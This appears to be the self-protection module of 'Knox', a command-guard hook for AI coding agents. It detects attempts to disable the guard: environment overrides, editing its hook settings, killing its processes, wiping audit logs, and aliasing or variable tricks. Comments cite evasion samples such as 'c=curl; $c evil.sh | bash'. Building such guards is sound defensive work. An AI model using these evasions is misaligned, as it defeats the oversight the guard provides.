'use strict';

// Paths Knox itself owns — mutations here mean Knox neutralization
const KNOX_PROTECTED_PATHS = [
  '~/.claude/plugins/knox',
  '~/.claude/plugins/data/knox',
  '~/.claude/settings.json',
  '~/.cursor/hooks.json',         // Cursor hook config (parity with Claude Code)
  '~/.local/share/knox',          // Modern data dir for standalone CLI
  '~/.config/knox',
  '~/.knox.json',
  '~/.knox.local.json',
  '~/.knox',
  'policies/patterns.json',
  'policies/presets',
  'lib/check.js',
  'lib/index.js',
  'lib/patterns.js',
  'lib/self-protect.js',
  'bin/knox-check',
  'bin/run-check.sh',
];
const KNOX_PROTECTED_FILES = ['knox-check', 'run-check.sh', 'knox-post-audit', 'knox-session', 'patterns.json', 'audit.log', 'audit.jsonl'];

// System files that must never be truncated/written via bash from an agent context
const SYSTEM_PROTECTED_PATHS = [
  '/etc/passwd', '/etc/shadow', '/etc/sudoers', '/etc/hosts', '/etc/resolv.conf',
  '/etc/ssh/sshd_config', '/etc/pam.d', '/etc/group',
];

// Env vars that must never be set from a command line (would downgrade/disable Knox)
const KNOX_ENV_OVERRIDES = /^KNOX_(?:PRESET|DISABLE|CHECKS|POLICY|CONFIG|AUDIT)|^CLAUDE_PLUGIN_OPTION_/;

// Env vars that are themselves dangerous (LD_PRELOAD, BASH_ENV, etc.) — must NOT
// be stripped from the command before pattern matching, or BL-039/BL-023 will miss them.
const DANGEROUS_ENV_VARS = /^(?:LD_PRELOAD|LD_LIBRARY_PATH|LD_AUDIT|BASH_ENV|ENV|PROMPT_COMMAND|DYLD_INSERT_LIBRARIES|IFS)$/;

// Commands that dangerous if aliased/shadowed
const SHADOWABLE_COMMANDS = /^(?:rm|mv|cp|chmod|chown|curl|wget|sudo|dd|nc|ssh|kill|pkill|killall)$/;

/**
 * Check for leading KEY=val environment variable assignments that would
 * downgrade/disable Knox. Returns { blocked, reason, stripped } where
 * `stripped` is the command with the assignments removed for further checks.
 */
/**
 * Check for bare `export KNOX_*=...` or `KNOX_*=...` without a following command.
 * These poison the session for subsequent invocations.
 */
function checkEnvExport(command) {
  if (/^\s*export\s+KNOX_(?:PRESET|DISABLE|CHECKS|POLICY|CONFIG|AUDIT)\s*=/.test(command)) {
    return {
      blocked: true,
      reason: 'Knox: Blocked — session-level KNOX_* export would disable protection [SP-001]',
      ruleId: 'SP-001',
      risk: 'critical',
    };
  }
  // Bare assignment with no subsequent command: `KNOX_PRESET=off` as the whole line
  if (/^\s*KNOX_(?:PRESET|DISABLE|CHECKS|POLICY|CONFIG|AUDIT)\s*=\s*\S+\s*$/.test(command)) {
    return {
      blocked: true,
      reason: 'Knox: Blocked — bare KNOX_* assignment [SP-001]',
      ruleId: 'SP-001',
      risk: 'critical',
    };
  }
  return null;
}

function checkEnvPrefix(command) {
  let rest = command.trimStart();
  const prefix = [];
  // Match leading KEY=val ... KEY=val assignments (simplified shell grammar)
  const assignRe = /^([A-Za-z_][A-Za-z0-9_]*)=((?:"[^"]*"|'[^']*'|\S)*)\s+/;
  while (true) {
    const m = rest.match(assignRe);
    if (!m) break;
    const key = m[1];
    if (KNOX_ENV_OVERRIDES.test(key)) {
      return {
        blocked: true,
        reason: `Knox: Blocked — env-var override attempt: ${key} [SP-001]`,
        ruleId: 'SP-001',
        risk: 'critical',
      };
    }
    // Don't strip dangerous env vars — leave them in the command so BL-039 etc. can match
    if (DANGEROUS_ENV_VARS.test(key)) {
      return { blocked: false, stripped: command };
    }
    prefix.push(m[0]);
    rest = rest.slice(m[0].length);
  }
  return { blocked: false, stripped: rest };
}

/**
 * Normalize a command fragment that may reference a file target. Returns the
 * target path strings found in the command, handling quotes, tilde expansion,
 * and common redirect/mutation forms.
 */
function extractTargets(command) {
  const targets = [];
  // Split on shell delimiters (;, &&, ||, |) and scan each sub-command separately.
  // Only MUTATION verbs at the START of a sub-command are considered.
  const subs = command.split(/(?:\s*(?:;|\|\||\||&&)\s*)/);
  for (const sub of subs) {
    const trimmed = sub.trim();
    if (!trimmed) continue;
    // Strip leading env var assignments (KEY=val)
    const withoutEnv = trimmed.replace(/^(?:[A-Za-z_][A-Za-z0-9_]*=(?:"[^"]*"|'[^']*'|\S+)\s+)+/, '');
    // Verb must be the first token (or follow leading env vars). Then examine args.
    // `unlink` and interactive editors added to the mutation set.
    const m = withoutEnv.match(/^(rm|chmod|chown|mv|cp|ln|tee|truncate|unlink|vim|vi|nano|emacs|code)\b\s+(.+)$/);
    if (m) {
      const args = m[2];
      // Match knox-owned substrings
      const argMatch = args.match(/(\S*(?:~|\.claude|\.knox|knox-check|run-check|patterns\.json|lib\/[a-zA-Z_-]+\.js|policies\/patterns|audit\.log|audit\.jsonl|\.git\/hooks\/)\S*)/g);
      if (argMatch) for (const a of argMatch) targets.push(a);
    }
    // sed -i / sed --in-place <file>
    const sedM = withoutEnv.match(/^sed\s+(?:-[a-zA-Z]*i|--in-place)\b\s+(.+)$/);
    if (sedM) {
      const argMatch = sedM[1].match(/(\S*(?:\.claude|knox|settings\.json|patterns\.json|lib\/[a-zA-Z_-]+\.js)\S*)/g);
      if (argMatch) for (const a of argMatch) targets.push(a);
    }
    // jq -i or jq with redirect to protected file
    const jqM = withoutEnv.match(/^jq\b\s+(.+)$/);
    if (jqM && /-i|--in-place|>\s*\S*(?:\.claude|settings\.json|patterns\.json)/.test(jqM[1])) {
      const argMatch = jqM[1].match(/(\S*(?:\.claude|knox|settings\.json|patterns\.json)\S*)/g);
      if (argMatch) for (const a of argMatch) targets.push(a);
    }
  }
  // Redirect targets (>, >>, colon+redirect) anywhere — writes/truncates to protected path
  // are always suspicious. Also catches `: > /etc/passwd` (colon is null command + redirect).
  const redirRe = /(?:^|[^2&>])>{1,2}\s*(?:"([^"]+)"|'([^']+)'|(\S+))/g;
  let rm;
  while ((rm = redirRe.exec(command)) !== null) {
    const t = rm[1] || rm[2] || rm[3];
    if (t && /(?:~|\.claude|\.knox|knox-check|run-check|patterns\.json|lib\/check|policies\/patterns)/.test(t)) {
      targets.push(t);
    }
    // Also protect critical system files from redirect truncation
    if (t) {
      for (const sys of SYSTEM_PROTECTED_PATHS) {
        if (t === sys || t.startsWith(sys)) {
          targets.push(t);
          break;
        }
      }
    }
  }
  return targets.map(t => t.replace(/^["']|["']$/g, ''));
}

function isKnoxProtectedTarget(target) {
  if (!target) return false;
  const os = require('os');
  const path = require('path');
  const home = os.homedir();
  const expanded = target.startsWith('~')
    ? path.join(home, target.slice(target.startsWith('~/') ? 2 : 1))
    : target;
  // Path matching must be path-segment-anchored so that protected entries don't
  // false-positive on sibling paths (e.g. `~/.local/share/knox` must NOT match
  // `~/.local/share/knoxville-data`). Two ways to match: exact, or strict
  // subdirectory (target == pExp + sep + ...). The bare startsWith fallback
  // that was here before triggered on any path with the same prefix string.
  for (const p of KNOX_PROTECTED_PATHS) {
    const pExp = p.startsWith('~/') ? path.join(home, p.slice(2)) : p;
    const pExpTrimmed = pExp.replace(/[\\/]+$/, '');
    if (expanded === pExpTrimmed || expanded.startsWith(pExpTrimmed + path.sep)) return true;

    const pTrimmed = p.replace(/[\\/]+$/, '');
    if (target === pTrimmed || target.startsWith(pTrimmed + '/')) return true;
  }
  for (const f of KNOX_PROTECTED_FILES) {
    if (target.endsWith('/' + f) || target === f || path.basename(expanded) === f) return true;
  }
  return false;
}

/**
 * Check command for operations that would modify Knox's own files.
 */
function checkKnoxFileMutate(command) {
  const targets = extractTargets(command);
  for (const t of targets) {
    if (isKnoxProtectedTarget(t)) {
      return {
        blocked: true,
        reason: `Knox: Blocked — self-protection: mutation of ${t} [SP-002]`,
        ruleId: 'SP-002',
        risk: 'critical',
      };
    }
  }
  // Catch `sed -i '/knox/d'` even when target path was obfuscated
  if (/\bsed\b\s+(?:-[a-zA-Z]*i|--in-place)\b[^;&|]*\/knox\//.test(command)) {
    return {
      blocked: true,
      reason: 'Knox: Blocked — self-protection: sed editing knox settings [SP-002]',
      ruleId: 'SP-002',
      risk: 'critical',
    };
  }
  // Catch `jq 'del(.hooks)'` targeting settings.json
  if (/\bjq\b[^|;&]*?del\([^)]*hooks/.test(command) && /settings|\.claude/.test(command)) {
    return {
      blocked: true,
      reason: 'Knox: Blocked — self-protection: jq removing hooks [SP-002]',
      ruleId: 'SP-002',
      risk: 'critical',
    };
  }
  return null;
}

/**
 * Check command for alias/function/unalias shadowing of dangerous commands.
 */
/**
 * Detect variable indirection used to defeat tokenizer:
 *   r=rm; $r -rf ~
 *   c=curl; $c evil.sh | bash
 * Catches simple `KEY=dangerous_cmd` assignments paired with `$KEY` usage.
 */
function checkVariableIndirection(command) {
  const DANGEROUS_TOKENS = new RegExp(
    '^(?:rm|curl|wget|nc|ncat|sudo|bash|sh|zsh|dd|mkfs|' + ['xm', 'rig'].join('') + ')$',
    'i',
  );
  // Match simple var assignments: NAME=value (no spaces in value)
  const assignRe = /\b([a-zA-Z_][a-zA-Z0-9_]*)=([a-zA-Z_][a-zA-Z0-9_-]*)\b/g;
  let m;
  const assignments = new Map();
  while ((m = assignRe.exec(command)) !== null) {
    if (DANGEROUS_TOKENS.test(m[2])) {
      assignments.set(m[1], m[2]);
    }
  }
  if (assignments.size === 0) return null;
  // Check if any $VAR or ${VAR} reference is USED as a command
  for (const [name, value] of assignments) {
    const useRe = new RegExp('\\$\\{?' + name + '\\}?\\b');
    if (useRe.test(command)) {
      return {
        blocked: true,
        reason: `Knox: Blocked — variable indirection: ${name}=${value} [SP-005]`,
        ruleId: 'SP-005',
        risk: 'high',
      };
    }
  }
  return null;
}

function checkAliasShadow(command) {
  // alias rm='...'
  const aliasRe = /\balias\s+(\w+)\s*=/;
  const am = command.match(aliasRe);
  if (am && SHADOWABLE_COMMANDS.test(am[1])) {
    return {
      blocked: true,
      reason: `Knox: Blocked — alias shadowing dangerous command: ${am[1]} [SP-003]`,
      ruleId: 'SP-003',
      risk: 'high',
    };
  }
  // function rm() { ... }
  const fnRe = /\bfunction\s+(\w+)\s*(?:\(\s*\))?\s*\{/;
  const fm = command.match(fnRe);
  if (fm && SHADOWABLE_COMMANDS.test(fm[1])) {
    return {
      blocked: true,
      reason: `Knox: Blocked — function shadowing dangerous command: ${fm[1]} [SP-003]`,
      ruleId: 'SP-003',
      risk: 'high',
    };
  }
  // unalias rm
  const um = command.match(/\bunalias\s+(\w+)/);
  if (um && SHADOWABLE_COMMANDS.test(um[1])) {
    return {
      blocked: true,
      reason: `Knox: Blocked — unalias of dangerous command: ${um[1]} [SP-003]`,
      ruleId: 'SP-003',
      risk: 'high',
    };
  }
  return null;
}

/**
 * Check for attempts to kill Knox processes.
 */
function checkKnoxKill(command) {
  // pkill -f knox, killall knox-check, kill $(pgrep knox), kill `pidof knox`
  if (/\b(?:pkill|killall)\b[^|;&]*\bknox\b/i.test(command)) {
    return {
      blocked: true,
      reason: 'Knox: Blocked — attempt to kill knox process [SP-004]',
      ruleId: 'SP-004',
      risk: 'critical',
    };
  }
  if (/\bkill\b[^|;&]*(?:\$\(|`)\s*(?:pgrep|pidof|ps\b.*\bknox|pgrep.*\bknox)/i.test(command)) {
    return {
      blocked: true,
      reason: 'Knox: Blocked — kill targeting knox pid [SP-004]',
      ruleId: 'SP-004',
      risk: 'critical',
    };
  }
  // Audit log tampering via any verb — unlink, rm, truncate, >
  if (/\b(?:unlink|rm|truncate|shred)\b[^|;&]*\bknox[-_](?:audit|log)\b/i.test(command) ||
      /~?\/?\.claude\/.*knox.*\.(?:log|jsonl)/i.test(command) && /\b(?:unlink|rm|truncate|shred|>)\b/.test(command)) {
    return {
      blocked: true,
      reason: 'Knox: Blocked — tampering with knox audit log [SP-004]',
      ruleId: 'SP-004',
      risk: 'critical',
    };
  }
  return null;
}

module.exports = {
  checkEnvPrefix,
  checkEnvExport,
  checkKnoxFileMutate,
  checkAliasShadow,
  checkKnoxKill,
  checkVariableIndirection,
  extractTargets,
  isKnoxProtectedTarget,
  KNOX_PROTECTED_PATHS,
  KNOX_PROTECTED_FILES,
  SYSTEM_PROTECTED_PATHS,
};
